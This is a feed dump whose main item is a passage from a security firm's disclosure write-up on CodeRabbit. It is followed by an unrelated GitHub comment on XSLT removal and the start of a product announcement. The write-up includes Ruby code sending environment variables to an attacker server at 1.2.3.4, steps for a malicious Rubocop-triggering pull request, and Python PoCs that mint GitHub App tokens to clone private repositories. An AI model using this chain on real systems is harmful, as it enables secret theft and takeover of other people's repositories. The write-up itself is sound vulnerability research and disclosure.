  http = Net::HTTP.new(url.host, url.port)
  request = Net::HTTP::Post.new(url.path)
  request['Content-Type'] = 'application/json'
  request.body = json_data

  # Send the request
  response = http.request(request)
rescue StandardError =&gt; e
  puts "An error occurred: #{e.message}"
end
</pre></div>


<p>Exploiting this is as simple as following these steps:</p>



<ul>
<li>Get a free trial on CodeRabbit and register using a personal GitHub account</li>



<li>Create a private repository and grant CodeRabbit access to it, so that it reviews PRs on that repository</li>



<li>Create a PR that contains the following files:
<ul>
<li>A <code>.rubocop.yml</code> file as shown above</li>



<li>An <code>ext.rb</code> file as shown above</li>



<li>Any other large enough dummy Ruby file so that CodeRabbit triggers the execution of Rubocop and does not skip the file</li>
</ul>
</li>



<li>Wait for CodeRabbit to perform the code review and run our malicious ext.rb file</li>



<li>Collect the exfiltrated environment variables in the HTTP POST request received on our attacker-controlled server at 1.2.3.4</li>
</ul>



<p>Here’s an illustration of our malicious pull request to better understand how it works:</p>



<article>


  <div>

    <!-- main.rb -->
    <div>
      <h3>main.rb</h3>
      <pre><span># Contains dummy </span>
<span># Ruby code so </span>
<span># that Rubocop </span>
<span># gets executed</span>

puts "hello"
      </pre>
    </div>

    <!-- .rubocop.yml -->
    <div>
      <h3>.rubocop.yml</h3>
      <pre><span># Instructs </span>
<span># Rubocop to load </span>
<span># extension in </span>
<span># file ext.rb</span>

require:
  ./ext.rb
      </pre>
    </div>

    <!-- ext.rb -->
    <div>
      <h3>ext.rb</h3>
      <pre><span># Malicious Ruby </span>
<span># code goes here</span>
<span># </span>
<span># Example:</span>
<span># </span>
<span># Send all env vars </span>
<span># to http://1.2.3.4</span>
      </pre>
    </div>

  </div>

  <!-- Legend -->
  <p>
    An illustration of what the malicious pull request looks like
  </p>
</article>



<h2>Unpacking what we found</h2>



<p>After we created our malicious PR, CodeRabbit ran Rubocop on our code, which executed our malicious code and sent its environment variables to our server at 1.2.3.4.</p>



<p>On the server at <code>1.2.3.4</code>, the following JSON payload containing environment variables was received:</p>


<div><pre title="">{
  "ANTHROPIC_API_KEYS": "sk-ant-api03-(CENSORED)",
  "ANTHROPIC_API_KEYS_FREE": "sk-ant-api03-(CENSORED)",
  "ANTHROPIC_API_KEYS_OSS": "sk-ant-api03-(CENSORED)",
  "ANTHROPIC_API_KEYS_PAID": "sk-ant-api03-(CENSORED)",
  "ANTHROPIC_API_KEYS_TRIAL": "sk-ant-api03-(CENSORED)",
  "APERTURE_AGENT_ADDRESS": "(CENSORED)",
  "APERTURE_AGENT_KEY": "(CENSORED)",
  "AST_GREP_ESSENTIALS": "ast-grep-essentials",
  "AST_GREP_RULES_PATH": "/home/jailuser/ast-grep-rules",
  "AWS_ACCESS_KEY_ID": "",
  "AWS_REGION": "",
  "AWS_SECRET_ACCESS_KEY": "",
  "AZURE_GPT4OMINI_DEPLOYMENT_NAME": "",
  "AZURE_GPT4O_DEPLOYMENT_NAME": "",
  "AZURE_GPT4TURBO_DEPLOYMENT_NAME": "",
  "AZURE_O1MINI_DEPLOYMENT_NAME": "",
  "AZURE_O1_DEPLOYMENT_NAME": "",
  "AZURE_OPENAI_API_KEY": "",
  "AZURE_OPENAI_ENDPOINT": "",
  "AZURE_OPENAI_ORG_ID": "",
  "AZURE_OPENAI_PROJECT_ID": "",
  "BITBUCKET_SERVER_BOT_TOKEN": "",
  "BITBUCKET_SERVER_BOT_USERNAME": "",
  "BITBUCKET_SERVER_URL": "",
  "BITBUCKET_SERVER_WEBHOOK_SECRET": "",
  "BUNDLER_ORIG_BUNDLER_VERSION": "BUNDLER_ENVIRONMENT_PRESERVER_INTENTIONALLY_NIL",
  "BUNDLER_ORIG_BUNDLE_BIN_PATH": "BUNDLER_ENVIRONMENT_PRESERVER_INTENTIONALLY_NIL",
  "BUNDLER_ORIG_BUNDLE_GEMFILE": "BUNDLER_ENVIRONMENT_PRESERVER_INTENTIONALLY_NIL",
  "BUNDLER_ORIG_GEM_HOME": "BUNDLER_ENVIRONMENT_PRESERVER_INTENTIONALLY_NIL",
  "BUNDLER_ORIG_GEM_PATH": "BUNDLER_ENVIRONMENT_PRESERVER_INTENTIONALLY_NIL",
  "BUNDLER_ORIG_MANPATH": "BUNDLER_ENVIRONMENT_PRESERVER_INTENTIONALLY_NIL",
  "BUNDLER_ORIG_PATH": "/pnpm:/usr/local/go/bin:/root/.local/bin:/swift/usr/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
  "BUNDLER_ORIG_RB_USER_INSTALL": "BUNDLER_ENVIRONMENT_PRESERVER_INTENTIONALLY_NIL",
  "BUNDLER_ORIG_RUBYLIB": "BUNDLER_ENVIRONMENT_PRESERVER_INTENTIONALLY_NIL",
  "BUNDLER_ORIG_RUBYOPT": "BUNDLER_ENVIRONMENT_PRESERVER_INTENTIONALLY_NIL",
  "CI": "true",
  "CLOUD_API_URL": "https://(CENSORED)",
  "CLOUD_RUN_TIMEOUT_SECONDS": "3600",
  "CODEBASE_VERIFICATION": "true",
  "CODERABBIT_API_KEY": "",
  "CODERABBIT_API_URL": "https://(CENSORED)",
  "COURIER_NOTIFICATION_AUTH_TOKEN": "(CENSORED)",
  "COURIER_NOTIFICATION_ID": "(CENSORED)",
  "DB_API_URL": " https://(CENSORED)",
  "ENABLE_APERTURE": "true",
  "ENABLE_DOCSTRINGS": "true",
  "ENABLE_EVAL": "false",
  "ENABLE_LEARNINGS": "",
  "ENABLE_METRICS": "",
  "ENCRYPTION_PASSWORD": "(CENSORED)",
  "ENCRYPTION_SALT": "(CENSORED)",
  "FIREBASE_DB_ID": "",
  "FREE_UPGRADE_UNTIL": "2025-01-15",
  "GH_WEBHOOK_SECRET": "(CENSORED)",
  "GITHUB_APP_CLIENT_ID": "(CENSORED)",
  "GITHUB_APP_CLIENT_SECRET": "(CENSORED)",
  "GITHUB_APP_ID": "(CENSORED)",
  "GITHUB_APP_NAME": "coderabbitai",
  "GITHUB_APP_PEM_FILE": "-----BEGIN RSA PRIVATE KEY-----\n(CENSORED)-\n-----END RSA PRIVATE KEY-----\n",
  "GITHUB_CONCURRENCY": "8",
  "GITHUB_ENV": "",
  "GITHUB_EVENT_NAME": "",
  "GITHUB_TOKEN": "",
  "GITLAB_BOT_TOKEN": "(CENSORED)",
  "GITLAB_CONCURRENCY": "8",
  "GITLAB_WEBHOOK_SECRET": "",
  "HOME": "/root",
  "ISSUE_PROCESSING_BATCH_SIZE": "30",
  "ISSUE_PROCESSING_START_DATE": "2023-06-01",
  "JAILUSER": "jailuser",
  "JAILUSER_HOME_PATH": "/home/jailuser",
  "JIRA_APP_ID": "(CENSORED)",
  "JIRA_APP_SECRET": "(CENSORED)",
  "JIRA_CLIENT_ID": "(CENSORED)",
  "JIRA_DEV_CLIENT_ID": "(CENSORED)",
  "JIRA_DEV_SECRET": "(CENSORED)",
  "JIRA_HOST": "",
  "JIRA_PAT": "",
  "JIRA_SECRET": "(CENSORED)",
  "JIRA_TOKEN_URL": "https://auth.atlassian.com/oauth/token",
  "K_CONFIGURATION": "pr-reviewer-saas",
  "K_REVISION": "pr-reviewer-saas-(CENSORED)",
  "K_SERVICE": "pr-reviewer-saas",
  "LANGCHAIN_API_KEY": "(CENSORED)",
  "LANGCHAIN_PROJECT": "default",
  "LANGCHAIN_TRACING_SAMPLING_RATE_CR": "50",
  "LANGCHAIN_TRACING_V2": "true",
  "LANGUAGETOOL_API_KEY": "(CENSORED)",
  "LANGUAGETOOL_USERNAME": "(CENSORED)",
  "LD_LIBRARY_PATH": "/usr/local/lib:/usr/lib:/lib:/usr/libexec/swift/5.10.1/usr/lib",
  "LINEAR_PAT": "",
  "LLM_PROVIDER": "",
  "LLM_TIMEOUT": "300000",
  "LOCAL": "false",
  "NODE_ENV": "production",
  "NODE_VERSION": "22.9.0",
  "NPM_CONFIG_REGISTRY": "http://(CENSORED)",
  "OAUTH2_CLIENT_ID": "",
  "OAUTH2_CLIENT_SECRET": "",
  "OAUTH2_ENDPOINT": "",
  "OPENAI_API_KEYS": "sk-proj-(CENSORED)",
  "OPENAI_API_KEYS_FREE": "sk-proj-(CENSORED)",
  "OPENAI_API_KEYS_OSS": "sk-proj-(CENSORED)",
  "OPENAI_API_KEYS_PAID": "sk-proj-(CENSORED)",
  "OPENAI_API_KEYS_TRIAL": "sk-proj-(CENSORED)",
  "OPENAI_BASE_URL": "",
  "OPENAI_ORG_ID": "",
  "OPENAI_PROJECT_ID": "",
  "PATH": "/pnpm:/usr/local/go/bin:/root/.local/bin:/swift/usr/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
  "PINECONE_API_KEY": "(CENSORED)",
  "PINECONE_ENVIRONMENT": "us-central1-gcp",
  "PNPM_HOME": "/pnpm",
  "PORT": "8080",
  "POSTGRESQL_DATABASE": "(CENSORED)",
  "POSTGRESQL_HOST": "(CENSORED)",
  "POSTGRESQL_PASSWORD": "(CENSORED)",
  "POSTGRESQL_USER": "(CENSORED)",
  "PWD": "/inmem/21/d277c149-9d6a-4dde-88cc-03f724b50e2d/home/jailuser/git",
  "REVIEW_EVERYTHING": "false",
  "ROOT_COLLECTION": "",
  "SELF_HOSTED": "",
  "SELF_HOSTED_KNOWLEDGE_BASE": "",
  "SELF_HOSTED_KNOWLEDGE_BASE_BRANCH": "",
  "SENTRY_DSN": "https://(CENSORED)",
  "SERVICE_NAME": "pr-reviewer-saas",
  "SHLVL": "0",
  "TELEMETRY_COLLECTOR_URL": "https://(CENSORED)",
  "TEMP_PATH": "/inmem",
  "TINI_VERSION": "v0.19.0",
  "TRPC_API_BASE_URL": "https://(CENSORED)",
  "VECTOR_COLLECTION": "",
  "YARN_VERSION": "1.22.22",
  "_": "/usr/local/bin/rubocop"
}
</pre></div>


<p>That payload contained so many secrets that it actually took me a few minutes to grasp what we had gotten access to. The environment variables contained, notably:</p>



<ul>
<li>Anthropic API keys (free, oss, paid, trial, etc.)</li>



<li>OpenAI API keys (free, oss, paid, trial, etc.)</li>



<li>Aperture agent key</li>



<li>Courier auth token</li>



<li>Encryption password and salt</li>



<li>Gitlab personal access token</li>



<li>CodeRabbit GitHub App private key, app client id, app client secret, app id</li>



<li>Jira secret</li>



<li>Langchain/langsmith API key</li>



<li>LanguageTool API key</li>



<li>Pinecone API key</li>



<li>PostgreSQL database host, username and password</li>
</ul>



<p>Leaking environment variables is one thing, but since we obtained remote code execution (RCE) on that server, there is even more that an attacker could have done. Indeed, they could connect to the Postgres database server on the internal network. They could perform destructive operations. They could likely obtain the source code of the CodeRabbit app itself which is potentially somewhere in the Docker container where the external tool runs.</p>



<p>Before exploring the leaked environment variables further, we performed a few minimal reconnaissance operations, such as listing a few directories and reading the contents of a couple files on the production system, just to confirm the impacts. But this process was not really efficient and we were not able to quickly confirm the presence of the original source code of the CodeRabbit webapp there. However, the built application was there in the <code>/app/pr-reviewer-saas/dist</code> directory.<br>Additionally, since this was a production server, we didn’t want to do anything that could disrupt the CodeRabbit service and decided to stop there.<br>But there was more. Let’s go back to the exfiltrated environment variables.</p>



<h2>Getting Read/write access to 1M repositories</h2>



<p>As mentioned above, one of the environment variables was named <code>GITHUB_APP_PEM_FILE</code> and its value contained a private key. This is actually the private key of the CodeRabbit GitHub app. This private key can be used to authenticate to the GitHub REST API and act on behalf of the CodeRabbit GitHub app. Since users of CodeRabbit have granted CodeRabbit write access to their repositories, this private key gives us write access to 1 million repositories!</p>



<p>Let’s go through a few operations that one can perform with this private key.</p>



<h3>Listing installations of the CodeRabbit app</h3>



<p>As of writing, the CodeRabbit GitHub app was installed over 80’000 times. Basically, this tells us that at least that amount of GitHub personal accounts or organizations installed CodeRabbit and use it for at least one of their repositories. But these accounts may very well have granted access to more than one repository, or even all of their repositories.</p>



<p>The CodeRabbit website states that they review 1M repositories. These include GitHub repositories, but likely also repositories from other platforms that CodeRabbit supports, such as Gitlab, and on-premises git providers.</p>



<p>We will see below (see Proof of concept) how one can programatically list GitHub app installations using the GitHub API.</p>



<h3>Listing GitHub repositories CodeRabbit has access to</h3>



<p>For a given installation, one can list the GitHub repositories to which this installation has been granted access.</p>



<p>We can also see that the installation has read/write access to the code of the repository, among other permissions. For reference, this is the list of permissions the CodeRabbit app has on the repositories it has access to:</p>


<div><pre title="">"permissions": {
    "actions": "read",
    "checks": "read",
    "contents": "write",
    "discussions": "read",
    "issues": "write",
    "members": "read",
    "metadata": "read",
    "pull_requests": "write",
    "statuses": "write"
  },
</pre></div>


<p>Note that these permissions are public information that anyone can <a href="https://api.github.com/apps/coderabbitai">see here</a>.</p>



<h3>Generating an access token valid for repositories that CodeRabbit has access to</h3>



<p>A GitHub API access token can be created for the CodeRabbit app installation. This access token has all the permissions listed above and can be used on all the repositories the app installation has access to. It can be used to, for example, clone the repository or push git commits to it, since we not only have read access but also write access to the <code>contents</code>. This can also be used to update GitHub releases, including the downloadable files (the assets), and replace them with malware and therefore serve malware directly from the targeted official GitHub repository.</p>



<p>The access token is valid for at most 10 minutes, but since we have the private key, more access tokens can be generated at any time, even if they expire.</p>



<h3>Cloning private repositories CodeRabbit has access to</h3>



<p>But this gets even scarier. Generated access tokens can also be used to clone private repositories (!) that the user has granted CodeRabbit access to. Indeed, as long as the user has granted CodeRabbit access to a repository, the private key can be used to access it. It doesn’t matter if it’s public or private.<br>Therefore, a malicious person could exploit the vulnerability to leak the CodeRabbit GitHub app private key, list all the installations, list each repository, generate an access token for each repository, and clone private repositories, serve malware from public repositories or manipulate the git history of a repository. This could be used to perform lateral movement and potentially leak GitHub repository secrets of the GitHub repository through GitHub actions if the targeted repository contains vulnerable GitHub actions.</p>



<h2>Proof of concept</h2>



<p>Here’s an example of how this can be achieved using the PyGitHub Python library, assuming that the private key is stored in a file called <code>priv.pem</code> and that we have the app ID and client ID (also leaked from the environment variables):</p>


<div><pre title="">#!/usr/bin/env python3  
import json  
import time  

import jwt  
import requests  
from github import Auth, GithubIntegration  

with open("priv.pem", "r") as f:  
    signing_key = f.read()  

app_id = "TODO_insert_app_id_here"  
client_id = "Iv1.TODO_insert_client_id_here"  


def gen_jwt():  
    payload = {  
        # Issued at time  
        'iat': int(time.time() - 60),  
        # JWT expiration time (10 minutes maximum)  
        'exp': int(time.time()) + 600 - 60,  
        # GitHub App's client ID  
        'iss': client_id  
    }  

    # Create JWT  
    encoded_jwt = jwt.encode(payload, signing_key, algorithm="RS256")  
    return encoded_jwt  


def create_access_token(install_id, jwt):  
    response = requests.post(  
        f"https://api.github.com/app/installations/{install_id}/access_tokens",  
        headers={  
            "Accept": "application/vnd.github+json",  
            "Authorization": f"Bearer {jwt}",  
            "X-GitHub-Api-Version": "2022-11-28",  
        }  
    )  
    j = response.json()  
    access_token = j["token"]  
    return access_token  


def auth():  
    auth = Auth.AppAuth(app_id, signing_key)  
    gi = GithubIntegration(auth=auth)  
    app = gi.get_app()  

    # iterate through app installations, get the first 5  
    for installation in gi.get_installations().reversed[:5]:  
        install_id = installation.id  

    # or access an installation by its ID directly  
    installation = gi.get_app_installation(install_id)  

    jwt = gen_jwt()  
    create_access_token(install_id, jwt)  

    # get all github repositories this installation has access to  
    repos = installation.get_repos()  
    for repo in repos:  
        full_name = repo.full_name  
        stars = repo.stargazers_count  
        html_url = repo.html_url  
        is_private_repo = repo.private  
        clone_url = f"https://x-access-token:{access_token}@github.com/{full_name}.git"  
        print(clone_url)  

        # repo can be cloned with "git clone {clone_url}"  
        # access token is valid for 10 minutes, but a new one can be generated whenever needed  

if __name__ == "__main__":  
    auth()
</pre></div>


<p>Obviously, iterating through the list of all GitHub installations of the CodeRabbit app would have required making thousands of requests to the GitHub API on behalf of the production CodeRabbit GitHub app and this may have exceeded the API quota. We didn’t want to risk disrupting the production CodeRabbit service so we only iterated through a couple installations to confirm the PoC was working.</p>



<h2>Leaking CodeRabbit’s private repositories</h2>



<p>We mentioned earlier that we couldn’t confirm the presence of the original source code of CodeRabbit on the production Docker container. Well, since CodeRabbit eats their own dog food, they run CodeRabbit on their own GitHub repositories. We can therefore easily retrieve the app installation ID for their GitHub organization and list the repositories this app installation has access to.</p>



<p>This is the list of private repositories the coderabbitai GitHub organization has granted CodeRabbit access to:</p>



<ul>
<li><a href="https://github.com/coderabbitai/mono" rel="nofollow">https://github.com/coderabbitai/mono</a></li>



<li><a href="https://github.com/coderabbitai/pr-reviewer-saas" rel="nofollow">https://github.com/coderabbitai/pr-reviewer-saas</a></li>



<li><a href="https://github.com/coderabbitai/e2e-reviewer" rel="nofollow">https://github.com/coderabbitai/e2e-reviewer</a></li>



<li><a href="https://github.com/coderabbitai/pr-reviewer-client" rel="nofollow">https://github.com/coderabbitai/pr-reviewer-client</a></li>



<li><a href="https://github.com/coderabbitai/db-client" rel="nofollow">https://github.com/coderabbitai/db-client</a></li>



<li><a href="https://github.com/coderabbitai/rabbits-lab" rel="nofollow">https://github.com/coderabbitai/rabbits-lab</a></li>



<li><a href="https://github.com/coderabbitai/website" rel="nofollow">https://github.com/coderabbitai/website</a></li>



<li><a href="https://github.com/coderabbitai/hubspot-reporting" rel="nofollow">https://github.com/coderabbitai/hubspot-reporting</a></li>
</ul>



<p>To go further, one can generate an access token (as explained above) and clone these private repositories, including what looks like their monorepo (<code>coderabbitai/mono</code>) or the <code>coderabbitai/pr-reviewer-saas</code> repository.</p>



<p>Here’s the PoC to do this. Note that it’s similar to the above, except that we directly retrieve the app installation for a specific GitHub organization by its name, instead of iterating through all the installations:</p>


<div><pre title="">#!/usr/bin/env python3  
import time  

import jwt  
import requests  
from github import Auth, GithubIntegration  

with open("priv.pem", "r") as f:  
    signing_key = f.read()  

app_id = "CENSORED"  
client_id = "CENSORED"  


def gen_jwt():  
    payload = {  
        # Issued at time  
        'iat': int(time.time() - 60),  
        # JWT expiration time (10 minutes maximum)  
        'exp': int(time.time()) + 600 - 60,  
        # GitHub App's client ID  
        'iss': client_id  
    }  

    # Create JWT  
    encoded_jwt = jwt.encode(payload, signing_key, algorithm="RS256")  
    return encoded_jwt  


def auth():  
    auth = Auth.AppAuth(app_id, signing_key)  
    gi = GithubIntegration(auth=auth)  

    # Target a specific Github organization that uses CodeRabbit  
    org = "coderabbitai"    
    installation = gi.get_org_installation(org)  

    # Target a specific Github user that uses CodeRabbit
    # user = "amietn"  
    # installation = gi.get_user_installation(user)  

    print(installation.id)  
    gen_token = True  

    if gen_token:  
        jwt = gen_jwt()  
        response = requests.post(  
            f"https://api.github.com/app/installations/{installation.id}/access_tokens",  
            headers={  
                "Accept": "application/vnd.github+json",  
                "Authorization": f"Bearer {jwt}",  
                "X-GitHub-Api-Version": "2022-11-28",  
            }  
        )  
        j = response.json()  
        access_token = j["token"]  

    repos = installation.get_repos()  
    print("---repos---")  
    for repo in repos:  
        full_name = repo.full_name  
        html_url = repo.html_url  
        private = repo.private  
        if private:  
            print(f"* {full_name} ({private=}) - {html_url}")  

            if gen_token:  
                clone_url = f"https://x-access-token:{access_token}@github.com/{full_name}.git"  
                print(clone_url)  


if __name__ == "__main__":  
    auth()
</pre></div>


<p>In a similar way, a malicious person could target not only a specific GitHub organization but also a specific GitHub personal account that uses CodeRabbit and access their private repositories and/or modify them.</p>



<p>As you can see, one can directly obtain the app installation ID for an organization or a user. So, this way there is no need to iterate through all the GitHub app installations to find a specific GitHub user or organization. Only the organization or user’s name is required.</p>



<h2>Impacts summary</h2>



<p>Let’s take a moment to summarize the impacts of getting write access to these 1 million repositories. A malicious person could have performed the following operations on affected repositories:</p>



<ul>
<li>Access private GitHub repositories nobody was ever supposed to access. This is a privacy breach.</li>



<li>Modify the git history of affected GitHub repositories – Note that this can be a supply chain attack since GitHub repositories are often the source for building software before it’s distributed</li>



<li>Modify existing GitHub releases and replace or add malicious downloadable files – Supply chain attack</li>



<li>Further lateral moves to potentially leak GitHub repository secrets by exploiting existing vulnerable GitHub actions by pushing git commits – Note that since the CodeRabbit GitHub app doesn’t have write permission to workflows, GitHub actions can’t be directly modified. However, a vulnerable GitHub action may be exploited more easily with write access to the git repository. See the talk I gave at 38C3 for more details on how we found an instance where this was exploitable.</li>
</ul>



<p>Additionally, we obtained RCE on the CodeRabbit production system. A malicious person could have performed destructive operations, caused a denial of service, or performed malicious operations on third party systems (see list of leaked secrets above).</p>



<h2>Context is key</h2>



<p>While running the exploit, CodeRabbit would still review our pull request and post a comment on the GitHub PR saying that it detected a critical security risk, yet the application would happily execute our code because it wouldn’t understand that this was actually running on their production system.</p>



<figure><a href="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/coderabbit-review.png"><img data-attachment-id="20121" data-permalink="https://research.kudelskisecurity.com/2025/08/19/how-we-exploited-coderabbit-from-a-simple-pr-to-rce-and-write-access-on-1m-repositories/coderabbit-review/" data-orig-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/coderabbit-review.png" data-orig-size="1983,1224" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="coderabbit-review" data-image-description="" data-image-caption="" data-medium-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/coderabbit-review.png?w=300" data-large-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/coderabbit-review.png?w=840" loading="lazy" width="1024" height="632" src="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/coderabbit-review.png?w=1024" alt=""></a><figcaption>CodeRabbit’s code review of the exfiltration PoC PR</figcaption></figure>



<h2>Remediation</h2>



<p>CodeRabbit supports running dozens of external tools. These tools may get updates and new tools may be supported. Both cases may open the door to new ways of running arbitrary code. Therefore, trying to prevent arbitrary code execution through these tools sounds like an impossible task.</p>



<p>Instead, it would be best to assume that the user may be able to run untrusted code through these tools. So, running them in an isolated environment, with only the minimum information required to run the tools themselves, and not passing them any environment variables would be much better. Even if arbitrary code execution would be possible, the impact would be much less severe.</p>



<p>For defense in depth, one should add a mechanism that prevents sending private information to an attacker-controlled server. For example, only allow outgoing traffic to whitelisted hosts, if possible. If the tool doesn’t require internet access, then all network traffic may even be disabled in that isolated environment. This way it would make it harder for an attacker to exfiltrate secrets.</p>



<h2>Responsible disclosure</h2>



<p>After responsibly disclosing this critical vulnerability to the CodeRabbit team, we learned from them that they had an isolation mechanism in place, but Rubocop somehow was not running inside it. The CodeRabbit team was extremely responsive and acknowledged receipt of the disclosure the same day. They immediately disabled Rubocop and rotated the secrets and started working on a fix. The next week they told us that the vulnerability had been fixed. Kudos to the CodeRabbit team for responding promptly and fixing the issue.</p>



<p>Here is a summary of the disclosure timeline:</p>



<ul>
<li>January 24, 2025:
<ul>
<li>Disclose vulnerability to CodeRabbit</li>



<li>CodeRabbit acknowledges vulnerability and confirms they are working on a fix</li>
</ul>
</li>



<li>January 30, 2025:
<ul>
<li>CodeRabbit confirms fix</li>
</ul>
</li>
</ul>



<h2>Conclusions</h2>



<p>In the end, we only provided PoCs and didn’t take things further. A patient attacker could have enumerated the available access, identified the highest value targets, and then attacked those targets to distribute malware to countless others in a larger supply chain attack. Security is hard, and a variety of factors can come together to create security issues. Being quick to respond and remediate, as the CodeRabbit team was, is a critical part of addressing vulnerabilities in modern, fast-moving environments. Other vendors we contacted never responded at all, and their products are still vulnerable.</p>



<p>In the race to bring AI-powered products to market, many companies prioritize speed over security. While rapid innovation is exciting, overlooking security can have catastrophic consequences, as we’ve seen. The solution isn’t to stop but to build security into the development process from day one. By making security a core priority, AI companies can create products that are not only groundbreaking but also resilient and responsible. After all, true innovation isn’t just about moving fast. It’s about building something resilient and safe for users.</p>

		
	</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Chrome intends to remove XSLT from the HTML spec (364 pts)]]></title>
            <link>https://github.com/whatwg/html/pull/11563</link>
            <guid>44952185</guid>
            <pubDate>Tue, 19 Aug 2025 14:48:54 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/whatwg/html/pull/11563">https://github.com/whatwg/html/pull/11563</a>, See on <a href="https://news.ycombinator.com/item?id=44952185">Hacker News</a></p>
<div id="readability-page-1" class="page"><div disabled="" sortable="">
          <p dir="auto">First, my apologies for commenting here; <a data-error-text="Failed to load title" data-id="3285251497" data-permission-text="Title is private" data-url="https://github.com/whatwg/html/issues/11523" data-hovercard-type="issue" data-hovercard-url="/whatwg/html/issues/11523/hovercard" href="https://github.com/whatwg/html/issues/11523">#11523</a> was (rightfully) locked while I was in the middle of composing this comment, but I didn't see any of these points mentioned elsewhere in that thread, so I'm adding it here.</p>
<hr>
<ol dir="auto">
<li>
<p dir="auto">Do any of your usage statistics show the age and “size” (popularity) of pages that use XSLT?</p>
<p dir="auto">Because if XSLT is mainly used by large commercial sites that are frequently updated, then deprecating the builtin support seems reasonable, since most of the sites will quickly update to include a polyfill. But if XSLT is mainly used by small personal sites that were last updated decades ago, then I wouldn't expect many of these sites to (ever) update, meaning that removing XSLT support would just mean that these sites will be broken forever.</p>
<p dir="auto">Given that XSLT has been supported since 1999 and its usage has been trending downwards, I suspect that the affected sites will mainly fall into the second category, meaning that the most likely outcome is site breakage rather than sites updating to use a polyfill.</p>
</li>
<li>
<p dir="auto">Well-built web pages use progressive enhancement, so even if any particular JavaScript/CSS feature is broken/removed, the page should still continue to partially work. So if JavaScript support for <code>XSLTProcessor()</code> is removed, then at the worst, all the JavaScript on a page will be broken, but the rest of the page should still be usable.</p>
<p dir="auto">However, removing support for <code>&lt;?xml-stylesheet … ?&gt;</code> seems particularly problematic, because if that is no longer supported, then users will simply see raw, unformatted XML, which makes the page completely unusable for non-technical users.</p>
</li>
<li>
<p dir="auto">Previous web platform deprecations have mainly affected JavaScript, and occasionally (or maybe never, I can't find any examples) CSS. Many legacy HTML features have been deprecated, but as far as I'm aware, all of them still work with all modern browsers. Some random examples:</p>
<ul dir="auto">
<li><a href="https://caniuse.com/mdn-html_elements_font" rel="nofollow"><code>&lt;font&gt;</code></a></li>
<li><a href="https://caniuse.com/mdn-html_elements_th_align" rel="nofollow"><code>align=</code></a></li>
<li><a href="https://caniuse.com/mdn-html_elements_xmp" rel="nofollow"><code>&lt;xmp&gt;</code></a></li>
</ul>
<p dir="auto">So while previous removals may have broken complex/interactive web apps, or may have caused minor format/layout changes, nothing has outright removed features used by pure “documents” (as in things that you could print on paper). However, many traditional documents use <code>&lt;?xml-stylesheet … ?&gt;</code>, so its removal seems unprecedented. But I may be completely wrong here, so please feel free to correct me.</p>
</li>
</ol>
<hr>
<p dir="auto">Personal note: I maintain a site that uses <code>XSLTProcessor()</code> interactively and that separately uses <code>&lt;?xml-stylesheet … ?&gt;</code> for RSS feeds; it would be slightly annoying if I had to add a polyfill, but I'd have no problem updating it before any browser changes are introduced, so no users will ever experience any breakage.</p>
<p dir="auto">However, my main concern is for the “long tail” of the web—there's lots of vital information only available on random university/personal websites last updated before 2005, or are only available on the <a href="https://archive.org/" rel="nofollow">Internet Archive</a>. Many of these sites use <code>&lt;?xml-stylesheet … ?&gt;</code> (and other obsolete features not discussed here like <code>&lt;frameset&gt;</code> and <code>&lt;font&gt;</code>), and it would be a real shame if these sites stopped working.</p>
      </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Positron, a New Data Science IDE (152 pts)]]></title>
            <link>https://posit.co/blog/positron-product-announcement-aug-2025/</link>
            <guid>44951862</guid>
            <pubDate>Tue, 19 Aug 2025 14:20:25 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://posit.co/blog/positron-product-announcement-aug-2025/">https://posit.co/blog/positron-product-announcement-aug-2025/</a>, See on <a href="https://news.ycombinator.com/item?id=44951862">Hacker News</a></p>
<div id="readability-page-1" class="page"><div aria-label="Posit page content">
                <!-- .section-breadcrumbs -->

    <section>
                    <div id="hero">
        
        
                <p><img src="https://posit.co/wp-content/uploads/2025/08/FEATURED-BLOG-IMAGE-POSITRON-GTM-BLOG-POST-ANNOUNCEMENT-1.jpg" alt="A software interface with a light grey background and a green, orange, and blue color scheme. In the top-left corner, an orange text box reads &quot;FALL 2025 PRODUCT ANNOUNCEMENT.&quot; Below it is a logo featuring a blue letter 'R' with a yellow figure next to it, and the word &quot;Positron.&quot; The main central panel is a software development environment, showing code with line numbers and comments. The code appears to be analyzing weather data. The right side of the screen shows various panels: one for &quot;VARIABLES,&quot; one for &quot;Precipitation Trends Across Cities (2023-2025)&quot; with multiple small line graphs, and another with a code editor and a chatbot feature that says &quot;Welcome to Positron Assistant.&quot; The interface displays different aspects of data analysis, coding, and an AI assistant." data-eio="l" data-old-src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAB4AAAAQ4AQAAAADAqPzuAAAAAnRSTlMAAHaTzTgAAAETSURBVHja7cEBDQAAAMKg909tDwcUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADApwH45QAB/OGP/gAAAABJRU5ErkJggg==" 